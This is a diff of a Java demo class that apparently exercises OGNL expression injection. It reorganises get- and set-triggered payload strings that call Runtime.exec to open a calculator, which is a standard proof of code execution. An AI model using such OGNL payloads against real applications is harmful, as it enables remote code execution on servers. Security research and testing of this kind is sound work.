@@ -9,17 +9,14 @@ import ognl.OgnlContext;
 public class OGNL {
 
     public static void main(String[] args) {
+        new OGNL().getValueDemo();
+    }
+
+    public void getValueDemo(){
         /**
          * 无回显 get触发
          */
         String baseGetPayload = "@java.lang.Runtime@getRuntime().exec('open -a Calculator.app')";
-//        ognlGetValue(baseGetPayload);
-
-        /**
-         * 无回显 set触发
-         */
-        String baseSetPayload = "(@java.lang.Runtime@getRuntime().exec(\'open -a Calculator.app\'))(a)(b)";
-//        ognlSetValue(baseSetPayload);
 
         /**
          * Ognl解析后，存在直接打印的情况
@@ -64,10 +61,17 @@ public class OGNL {
          * todo 类加载
          */
 
-
         Object obj = ognlGetValue(sleep);
+
         System.out.println(obj);
-//        ognlSetValue(jsPayloadNormalSet);
+    }
+
+    public void setValueDemo(){
+        /**
+         * 无回显 set触发
+         */
+        String baseSetPayload = "(@java.lang.Runtime@getRuntime().exec(\'open -a Calculator.app\'))(a)(b)";
+        ognlSetValue(baseSetPayload);
     }
 
     /**
